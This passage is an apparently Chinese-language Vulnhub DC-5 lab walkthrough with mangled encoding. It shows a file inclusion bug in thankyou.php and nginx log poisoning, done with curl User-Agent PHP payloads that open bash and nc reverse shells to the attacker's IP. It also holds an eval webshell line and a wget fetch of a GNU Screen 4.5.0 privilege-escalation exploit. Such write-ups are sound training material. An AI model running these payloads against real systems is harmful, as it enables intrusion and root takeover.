æ·±å…¥ç†è§£è¿›ç¨‹æƒé™<em>linux shell</em>è„šæœ¬ä¹‹å®¶ (jb51.net)</a></p><p><a href="http://c.biancheng.net/cpp/html/226.html">Cè¯­è¨€setuid()å‡½æ•°ï¼šè®¾ç½®çœŸå®çš„ç”¨æˆ·è¯†åˆ«ç _Cè¯­è¨€ä¸­æ–‡ç½‘ (biancheng.net)</a></p><p><a href="https://cloud.tencent.com/developer/article/1801346?from=15425">linuxæƒé™ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://www.cnblogs.com/SunMaolin/p/11982049.html">2019-2020-1 20199318ã€ŠLinuxå†…æ ¸åŸç†ä¸åˆ†æã€‹ç¬¬åäºŒå‘¨ä½œä¸š - å­™èŒ‚æ— - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCï¼š5</title>
    <link href="/2022/07/11/Penetration/Vulnhub/Part-1/0x08%20DC-5/"/>
    <url>/2022/07/11/Penetration/Vulnhub/Part-1/0x08%20DC-5/</url>
    
    <content type="html"><![CDATA[<h1 id="0x08-DC-5-vulnhub"><a href="#0x08-DC-5-vulnhub" class="headerlink" title="0x08 DC: 5~vulnhub"></a>0x08 DC: 5~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-5,314/">DC: 5 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.160</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.160</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.160</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-11 01:01 EDT<br>Nmap scan report for 192.168.135.160<br>Host is up (0.00059s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    nginx 1.6.2<br>|_http-server-header: nginx/1.6.2<br>|_http-title: Welcome<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          36336/tcp   status<br>|   100024  1          52090/udp6  status<br>|   100024  1          56452/tcp6  status<br>|_  100024  1          60965/udp   status<br>36336/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:01:AF:12 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>ssh</td><td>nginx 1.6.2</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td>2-4 (RPC #100000)</td></tr><tr><td>36336/tcp</td><td>open</td><td>status</td><td>1 (RPC #100024)</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>80ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼Œå¾—åˆ° robots.txtï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.160</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.160  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.160</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.160</span><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.160/_22-07-11_01-13-17.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-11_01-13-17.log<br>Target: http://192.168.135.160/<br><br>[01:13:17] Starting: <br>[01:13:34] 200 -    4KB - /contact.php                                      <br>[01:13:35] 301 -  184B  - /css  -&gt;  http://192.168.135.160/css/             <br>[01:13:37] 200 -    6KB - /faq.php                                          <br>[01:13:38] 200 -   17B  - /footer.php                                       <br>[01:13:39] 301 -  184B  - /images  -&gt;  http://192.168.135.160/images/       <br>[01:13:39] 403 -  570B  - /images/<br>[01:13:39] 200 -    4KB - /index.php                                        <br>[01:13:53] 200 -  852B  - /thankyou.php                                     <br>                                                                             <br>Task Completed                                 <br></code></pre></td></tr></table></figure><p>é¢˜ç›®ç»™çš„æç¤ºï¼š</p><blockquote><p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p></blockquote><p>è®¿é—® <code>http://192.168.135.160/footer.php</code> ï¼Œåˆ·æ–°å‘ç°å¹´ä»½ä¸€ç›´åœ¨å˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Copyright Â© 2017 ===&gt; Copyright Â© 2018 ===&gt; Copyright Â© 2019 ===&gt; Copyright Â© 2020<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.160/thankyou.php</code> ï¼Œåˆ·æ–°å‘ç°å¹´ä»½ä¹Ÿä¼šå˜ï¼Œä½†æ˜¯å…¶ä»–é¡µé¢åˆ·æ–°æ˜¯ä¸ä¼šå˜çš„ï¼Œè¯´æ˜ <code>thankyou.php</code> æ–‡ä»¶å¯èƒ½åŒ…å«äº† <code>footer.php</code> æ–‡ä»¶ï¼Œæ„å‘³ç€ <code>thankyou.php</code> æ–‡ä»¶å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ ã€‚</p><p>è®¿é—® <code>http://192.168.135.160/thankyou.php?file=/etc/passwd</code> ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span> <span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span> www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin <span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span> systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span> systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span> systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:systemd</span> Bus Proxy,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span> Debian-<span class="hljs-symbol">exim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/exim4</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/dbus</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">statd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/nfs</span><span class="hljs-symbol">:/bin/false</span> <span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span> <span class="hljs-symbol">dc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:dc</span>,,,<span class="hljs-symbol">:/home/dc</span><span class="hljs-symbol">:/bin/bash</span> <span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:MySQL</span> Server,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure><p>çš„ç¡®å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æƒ³äº†å¥½ä¹…éƒ½æ²¡æœ‰æƒ³åˆ°è¯¥æ€ä¹ˆç”¨è¿™ä¸ªæ¼æ´ï¼Œç½‘ä¸Šå‘ç°æœ‰äººæ˜¯é€šè¿‡æ—¥å¿—æ–‡ä»¶å¾—  shell çš„ ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>é€šè¿‡æ—¥å¿—æ–‡ä»¶å¾— shell çš„æ–¹æ³•ï¼Œä¸»è¦åŸç†æ˜¯ï¼šé€šè¿‡å‘èµ·å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬æˆ–è€…åå¼¹ shell çš„è¯·æ±‚ï¼Œå°†ä¸€å¥è¯æœ¨é©¬æˆ–è€…åå¼¹ shell å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œå†é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶ä»è€Œè¾¾åˆ°æ‰§è¡Œä¸€å¥è¯æœ¨é©¬æˆ–è€…åå¼¹ shell çš„ç›®çš„ ã€‚</p><p>è®¿é—®æ—¥å¿—ä¸»è¦è®°å½•å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å®¢æˆ·ç«¯å‘ Nginx æœåŠ¡å™¨å‘èµ·çš„æ¯ä¸€æ¬¡è¯·æ±‚éƒ½è®°å½•åœ¨è¿™é‡Œã€‚å®¢æˆ·ç«¯ IPï¼Œæµè§ˆå™¨ä¿¡æ¯ï¼Œrefererï¼Œè¯·æ±‚å¤„ç†æ—¶é—´ï¼Œè¯·æ±‚ URL ç­‰éƒ½å¯ä»¥åœ¨è®¿é—®æ—¥å¿—ä¸­å¾—åˆ° ã€‚</p><p>Nginx æœåŠ¡å™¨è®¿é—®æ—¥å¿—æ–‡ä»¶é»˜è®¤ç›®å½•æ˜¯ï¼š<code>/var/log/nginx/access.log</code></p><p>è®¿é—® <code>http://192.168.135.160/thankyou.php?file=/var/log/nginx/access.log</code> ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è®¿é—®è®°å½•ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.135.141</span> - - <span class="hljs-string">[11/Jul/2022:23:01:29 +1000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">4025</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">135</span>.<span class="hljs-number">141</span> - - <span class="hljs-string">[11/Jul/2022:23:01:36 +1000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">OPTIONS</span> / HTTP/1.1&quot;</span> <span class="hljs-number">405</span> <span class="hljs-number">172</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span> <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ curl å‘é€è¯·æ±‚ï¼š</p><blockquote><p>ç»å°è¯•å‘ç°ï¼Œbash ä¸å¯ä»¥åå¼¹ï¼Œnc å¯ä»¥åå¼¹</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;&lt;?php system(&#x27;bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1&#x27;) ?&gt;&quot;</span> http://192.168.135.160/thankyou.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> curl -A <span class="hljs-string">&quot;&lt;?php system(&#x27;nc -e /bin/sh 192.168.135.141 4444&#x27;) ?&gt;&quot;</span> http://192.168.135.160/thankyou.php</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨ <code>Burp</code>  åœ¨ <code>access.log</code> é‡Œé¢ä¼ å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åä¸Šèœåˆ€è¿›è¡Œè¿æ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GET /hello-world! &lt;?php @eval($_REQUEST[cmd])?&gt; HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure><p>kali ç›‘å¬ï¼Œæµè§ˆå™¨è®¿é—® <code>http://192.168.135.160/thankyou.php?file=/var/log/nginx/access.log</code> ï¼ŒæˆåŠŸå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.160] 53731<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-5:~/html$ pwd<br>pwd<br>/var/www/html<br>www-data@dc-5:~/html$ <br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>æŸ¥æ‰¾ SUIDï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span>    <br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°äº† <code>/bin/screen-4.5.0</code> </p><blockquote><p>GNU Screenæ˜¯ä¸€æ¬¾ç”±GNUè®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚Screenå¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚</p></blockquote><p>æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit screen 4.5.0</span><br>----------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                         |  Path<br>----------------------------------------------------------------------- ---------------------------------<br>GNU Screen 4.5.0 - Local Privilege Escalation                          | linux/local/41154.sh<br>GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                    | linux/local/41152.txt<br>----------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 41154.sh</span><br>  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation<br>      URL: https://www.exploit-db.com/exploits/41154<br>     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh<br>File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators<br><br>Copied to: /home/kali/41154.sh<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat 41154.sh</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªï¼ŒæŸ¥çœ‹è„šæœ¬ï¼Œå‘ç°éœ€è¦ä½¿ç”¨ gcc ï¼ŒæŸ¥çœ‹é¶æœºæœ‰æ²¡æœ‰ gccï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:~/html$ gcc --version<br>gcc --version<br>gcc (Debian 4.9.2-10+deb8u2) 4.9.2<br>Copyright (C) 2014 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ è‡³é¶æœº /tmp ç›®å½•ï¼ŒåŠ å¯æ‰§è¡Œæƒé™ï¼Œè¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-5:~/html$ pwd  <br>pwd<br>/var/www/html<br>www-data@dc-5:~/html$ wget http://192.168.135.141:8888/41154.sh<br>wget http://192.168.135.141:8888/41154.sh<br>converted &#x27;http://192.168.135.141:8888/41154.sh&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/41154.sh&#x27; (UTF-8)<br>--2022-07-13 01:21:43--  http://192.168.135.141:8888/41154.sh<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1192 (1.2K) [text/x-sh]<br>41154.sh: Permission denied<br><br>Cannot write to &#x27;41154.sh&#x27; (Permission denied).<br>www-data@dc-5:~/html$ ls 